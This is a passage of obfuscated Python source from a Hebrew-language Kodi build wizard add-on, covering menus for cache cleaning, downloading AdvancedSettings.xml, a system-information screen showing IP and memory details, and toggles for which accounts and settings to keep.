		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0OOOO0O000OO0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOOO0OOO0OO000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2899
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2900
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0O0OO00000OO0OO .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	if OO0O0OO00000OO0OO =='true':#line:2902
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0O0O0O0O00000O0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- ניקוי קאש בהפעלה: %s'%O000OO00OO0OOOO00 .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OOO0000OOO000OO .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO000OOOO0O0O000O .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2906
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2907
	addFile ('Include Video Cache in Clear Cache: %s'%O0000000000000OO0 .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	if O0000000000000OO0 =='true':#line:2909
		addFile ('--- Include All Video Addons: %s'%O0OO0O0OO00OO0O00 .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Bob: %s'%OOO0000O0OO0OOOOO .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Phoenix: %s'%OOOO0O00O0O00O0O0 .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Specto: %s'%OOO0OO00O0O0OOO00 .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Exodus: %s'%OOO00O00O00OOOOOO .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Salts: %s'%O0O0O00000O00O00O .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Salts HD Lite: %s'%OO0OO000O000OOOOO .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include One Channel: %s'%OOOO0O00O0OO000OO .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Genesis: %s'%O0OO0O0000O0OOO0O .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2920
	setView ('files','viewType')#line:2921
def advancedWindow (url =None ):#line:2923
	if not ADVANCEDFILE =='http://':#line:2924
		if url ==None :#line:2925
			OO0OO000000O0O000 =wiz .workingURL (ADVANCEDFILE )#line:2926
			OOO0OO0OO0O000O0O =uservar .ADVANCEDFILE #line:2927
		else :#line:2928
			OO0OO000000O0O000 =wiz .workingURL (url )#line:2929
			OOO0OO0OO0O000O0O =url #line:2930
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if os .path .exists (ADVANCED ):#line:2932
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if OO0OO000000O0O000 ==True :#line:2935
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			O0O0000O0OOO0OOO0 =wiz .openURL (OOO0OO0OO0O000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2937
			OOOO0O000O0OOOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0000O0OOO0OOO0 )#line:2938
			if len (OOOO0O000O0OOOOO0 )>0 :#line:2939
				for O0OO000OO00O0OO0O ,OO00O00OO00OO00O0 ,url ,OO00000O000O000O0 ,O00O0O00OO00O0O00 ,O00OO00O00OOO0O0O in OOOO0O000O0OOOOO0 :#line:2940
					if OO00O00OO00OO00O0 .lower ()=="yes":#line:2941
						addDir ("[B]%s[/B]"%O0OO000OO00O0OO0O ,'advancedsetting',url ,description =O00OO00O00OOO0O0O ,icon =OO00000O000O000O0 ,fanart =O00O0O00OO00O0O00 ,themeit =THEME3 )#line:2942
					else :#line:2943
						addFile (O0OO000OO00O0OO0O ,'writeadvanced',O0OO000OO00O0OO0O ,url ,description =O00OO00O00OOO0O0O ,icon =OO00000O000O000O0 ,fanart =O00O0O00OO00O0O00 ,themeit =THEME2 )#line:2944
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2945
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OO000000O0O000 )#line:2946
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2947
def writeAdvanced (OO0OOO00O00OO0OO0 ,O00O0O000O0O0O000 ):#line:2949
	OOOO0O00000OO0O00 =wiz .workingURL (O00O0O000O0O0O000 )#line:2950
	if OOOO0O00000OO0O00 ==True :#line:2951
		if os .path .exists (ADVANCED ):O00OO00OO00OO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOO00O00OO0OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2952
		else :O00OO00OO00OO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOO00O00OO0OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2953
		if O00OO00OO00OO0O00 ==1 :#line:2955
			OO00OO000O0000OOO =wiz .openURL (O00O0O000O0O0O000 )#line:2956
			OOO00O0OOO00000O0 =open (ADVANCED ,'w');#line:2957
			OOO00O0OOO00000O0 .write (OO00OO000O0000OOO )#line:2958
			OOO00O0OOO00000O0 .close ()#line:2959
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2960
			wiz .killxbmc (True )#line:2961
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2962
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0O00000OO0O00 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2963
def viewAdvanced ():#line:2965
	OOO0OO0OOOO0OO000 =open (ADVANCED )#line:2966
	O0O0O0OOO0O0O00O0 =OOO0OO0OOOO0OO000 .read ().replace ('\t','    ')#line:2967
	wiz .TextBox (ADDONTITLE ,O0O0O0OOO0O0O00O0 )#line:2968
	OOO0OO0OOOO0OO000 .close ()#line:2969
def removeAdvanced ():#line:2971
	if os .path .exists (ADVANCED ):#line:2972
		wiz .removeFile (ADVANCED )#line:2973
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2974
def showAutoAdvanced ():#line:2976
	notify .autoConfig ()#line:2977
def getIP ():#line:2979
	OOO00OOOO00OO0OOO ='http://whatismyipaddress.com/'#line:2980
	if not wiz .workingURL (OOO00OOOO00OO0OOO ):return 'Unknown','Unknown','Unknown'#line:2981
	O0OO0000OOOOO0000 =wiz .openURL (OOO00OOOO00OO0OOO ).replace ('\n','').replace ('\r','')#line:2982
	if not 'Access Denied'in O0OO0000OOOOO0000 :#line:2983
		O0000O00O00OOO00O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0OO0000OOOOO0000 )#line:2984
		OO00O0OO0OO0O0O00 =O0000O00O00OOO00O [0 ]if (len (O0000O00O00OOO00O )>0 )else 'Unknown'#line:2985
		OO0000O00OO00OO0O =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0OO0000OOOOO0000 )#line:2986
		OOO0O0O0O0OOO0O00 =OO0000O00OO00OO0O [0 ]if (len (OO0000O00OO00OO0O )>0 )else 'Unknown'#line:2987
		O0O0OOO000OO000OO =OO0000O00OO00OO0O [1 ]+', '+OO0000O00OO00OO0O [2 ]+', '+OO0000O00OO00OO0O [3 ]if (len (OO0000O00OO00OO0O )>2 )else 'Unknown'#line:2988
		return OO00O0OO0OO0O0O00 ,OOO0O0O0O0OOO0O00 ,O0O0OOO000OO000OO #line:2989
	else :return 'Unknown','Unknown','Unknown'#line:2990
def systemInfo ():#line:2992
	OO0O000O0000OOOO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3006
	OOO00OO000O000O00 =[];OO00OO00O000O00OO =0 #line:3007
	for O0OOOO0OOO0000OOO in OO0O000O0000OOOO0 :#line:3008
		OO000OO0OO0000O0O =wiz .getInfo (O0OOOO0OOO0000OOO )#line:3009
		OO0O00O000O0O0OOO =0 #line:3010
		while OO000OO0OO0000O0O =="Busy"and OO0O00O000O0O0OOO <10 :#line:3011
			OO000OO0OO0000O0O =wiz .getInfo (O0OOOO0OOO0000OOO );OO0O00O000O0O0OOO +=1 ;wiz .log ("%s sleep %s"%(O0OOOO0OOO0000OOO ,str (OO0O00O000O0O0OOO )));xbmc .sleep (1000 )#line:3012
		OOO00OO000O000O00 .append (OO000OO0OO0000O0O )#line:3013
		OO00OO00O000O00OO +=1 #line:3014
	O0OO00O000O0OOO00 =OOO00OO000O000O00 [8 ]if 'Una'in OOO00OO000O000O00 [8 ]else wiz .convertSize (int (float (OOO00OO000O000O00 [8 ][:-8 ]))*1024 *1024 )#line:3015
	OOO00O000OO000O0O =OOO00OO000O000O00 [9 ]if 'Una'in OOO00OO000O000O00 [9 ]else wiz .convertSize (int (float (OOO00OO000O000O00 [9 ][:-8 ]))*1024 *1024 )#line:3016
	O0O00OOO0OOO000OO =OOO00OO000O000O00 [10 ]if 'Una'in OOO00OO000O000O00 [10 ]else wiz .convertSize (int (float (OOO00OO000O000O00 [10 ][:-8 ]))*1024 *1024 )#line:3017
	OO0O0O0000000O0O0 =wiz .convertSize (int (float (OOO00OO000O000O00 [11 ][:-2 ]))*1024 *1024 )#line:3018
	O00O000OO0O000OOO =wiz .convertSize (int (float (OOO00OO000O000O00 [12 ][:-2 ]))*1024 *1024 )#line:3019
	OOOO0OOO0O00O0OO0 =wiz .convertSize (int (float (OOO00OO000O000O00 [13 ][:-2 ]))*1024 *1024 )#line:3020
	O0O0OO0OOOO000000 ,O0O0OO00O0OO0000O ,OOO00000O00OO000O =getIP ()#line:3021
	O0OOOO0OOO00O0OOO =[];OO00O0000O00O000O =[];OO0O0O0O0OOOOOOOO =[];O0OOOO0OO0OOO0OOO =[];OOO0OOO0O00O0OO00 =[];OOOOO000000O0OO0O =[];OOOO00O000O0O0O00 =[]#line:3023
	O0O0OO000OOO000OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3025
	for OO0O00OO0O00O00O0 in sorted (O0O0OO000OOO000OO ,key =lambda O0O0O0OO0000OOOOO :O0O0O0OO0000OOOOO ):#line:3026
		O0O00O000O000OOOO =os .path .split (OO0O00OO0O00O00O0 [:-1 ])[1 ]#line:3027
		if O0O00O000O000OOOO =='packages':continue #line:3028
		OOOO00O00000000OO =os .path .join (OO0O00OO0O00O00O0 ,'addon.xml')#line:3029
		if os .path .exists (OOOO00O00000000OO ):#line:3030
			O0O0O0O0OO0OO0000 =open (OOOO00O00000000OO )#line:3031
			OO000OOOOO0O0OO00 =O0O0O0O0OO0OO0000 .read ()#line:3032
			OO0OO00OO000000OO =re .compile ("<provides>(.+?)</provides>").findall (OO000OOOOO0O0OO00 )#line:3033
			if len (OO0OO00OO000000OO )==0 :#line:3034
				if O0O00O000O000OOOO .startswith ('skin'):OOOO00O000O0O0O00 .append (O0O00O000O000OOOO )#line:3035
				if O0O00O000O000OOOO .startswith ('repo'):OOO0OOO0O00O0OO00 .append (O0O00O000O000OOOO )#line:3036
				else :OOOOO000000O0OO0O .append (O0O00O000O000OOOO )#line:3037
			elif not (OO0OO00OO000000OO [0 ]).find ('executable')==-1 :O0OOOO0OO0OOO0OOO .append (O0O00O000O000OOOO )#line:3038
			elif not (OO0OO00OO000000OO [0 ]).find ('video')==-1 :OO0O0O0O0OOOOOOOO .append (O0O00O000O000OOOO )#line:3039
			elif not (OO0OO00OO000000OO [0 ]).find ('audio')==-1 :OO00O0000O00O000O .append (O0O00O000O000OOOO )#line:3040
			elif not (OO0OO00OO000000OO [0 ]).find ('image')==-1 :O0OOOO0OOO00O0OOO .append (O0O00O000O000OOOO )#line:3041
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3046
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O000O0OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O000OO000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOO0OOO000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0000000O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000OO0O000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO0O00O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO0OOOO000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00O0OO0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00000O00OO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000O00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	O0O000OO000O00000 =len (O0OOOO0OOO00O0OOO )+len (OO00O0000O00O000O )+len (OO0O0O0O0OOOOOOOO )+len (O0OOOO0OO0OOO0OOO )+len (OOOOO000000O0OO0O )+len (OOOO00O000O0O0O00 )+len (OOO0OOO0O00O0OO00 )#line:3071
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O000OO000O00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0O0O0OOOOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO0OO0OOO0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O0000O00O000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO0OOO00O0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OOO0O00O0OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO00O000O0O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO000000O0OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
def Menu ():#line:3080
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3081
def saveMenu ():#line:3083
	O0OO000OO0OO0O000 ='[COLOR yellow]מופעל[/COLOR]';OO00O00O0O00000O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3085
	OOOO00000OO00O0OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3086
	OOO00O00OOO0000O0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3087
	O0OO00O000OOOO000 ='true'if KEEPINFO =='true'else 'false'#line:3088
	O0OOOO0OO00O0O0O0 ='true'if KEEPSOUND =='true'else 'false'#line:3090
	O00OO000O000O0O0O ='true'if KEEPVIEW =='true'else 'false'#line:3091
	O0OO0O0OOO0000O00 ='true'if KEEPSKIN =='true'else 'false'#line:3092
	OO0000000O0O000O0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3093
	O0O00O00OOOO0O000 ='true'if KEEPSKIN3 =='true'else 'false'#line:3094
	O00OOO0000O0000O0 ='true'if KEEPADDONS =='true'else 'false'#line:3095
	OOOO000O000000O00 ='true'if KEEPPVR =='true'else 'false'#line:3096
	OO00000O0OOOOO0OO ='true'if KEEPTVLIST =='true'else 'false'#line:3097
	O00O000O0OOO0000O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3098
	O0000000O0O00O0O0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3099
	O0OOO00OOOOO0000O ='true'if KEEPHUBTV =='true'else 'false'#line:3100
	OO00000OO00OOOO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:3101
	O00O0O000O00OOO0O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3102
	OO000OO00OOOOO0O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3103
	O0O000O00O0OO00O0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3104
	OOOOOO00O0OO00O00 ='true'if KEEPHUBMENU =='true'else 'false'#line:3105
	OO000000OOOO00000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3106
	O0O0O00O00O00O00O ='true'if KEEPTRAKT =='true'else 'false'#line:3107
	O0OO0O00OOOOO0OO0 ='true'if KEEPREAL =='true'else 'false'#line:3108
	O0OOO00OOO00OOO0O ='true'if KEEPRD2 =='true'else 'false'#line:3109
	O000O0OOOOO0OO000 ='true'if KEEPTORNET =='true'else 'true'#line:3110
	OO0O000O00O0OO0O0 ='true'if KEEPLOGIN =='true'else 'false'#line:3111
	OO00OOOOO0000OO0O ='true'if KEEPSOURCES =='true'else 'false'#line:3112
	OOOO0OO000OOOOOO0 ='true'if KEEPADVANCED =='true'else 'false'#line:3113
	O000O0000OOOOOOOO ='true'if KEEPPROFILES =='true'else 'false'#line:3114
	O00000OO0O0OO000O ='true'if KEEPFAVS =='true'else 'false'#line:3115
	OOO0OOO00O00OOO00 ='true'if KEEPREPOS =='true'else 'false'#line:3116
	OO000OOO000OO0OOO ='true'if KEEPSUPER =='true'else 'false'#line:3117
	O000O0O0O00O00OO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3118
	O0000O00OO0OO00O0 ='true'if KEEPWEATHER =='true'else 'false'#line:3119
	O0OOOOO000000O0O0 ='true'if KEEPVICTORY =='true'else 'false'#line:3120
	OO00O0O0O0OO000OO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3121
	if O000O0O0O00O00OO0 =='true':#line:3123
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3125
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3126
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון RD:  '%O0OO0O00OOOOO0OO0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון טראקט:  '%O0O0O00O00O00O00O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מועדפים:  '%O00000OO0O0OO000O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOO000O000000O00 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OOOOO000000O0O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טלמדיה:  '%OO00O0O0O0OO000OO .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO00000O0OOOOO0OO .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח סרטים:  '%O00O000O0OOO0000O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח סדרות:  '%O0000000O0O00O0O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח טלויזיה:  '%O0OOO00OOOOO0000O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO00000OO00OOOO0O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח ספורט:  '%O00O0O000O00OOO0O .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח ילדים:  '%OO000OO00OOOOO0O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח מוסיקה:  '%O0O000O00O0OO00O0 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOOOO00O0OO00O00 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת כל האריחים בסקין:  '%O0OO0O0OOO0000O00 .replace ('true',O0OO000OO0OO0O000 ).replace ('false',OO00O00O0O00000O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
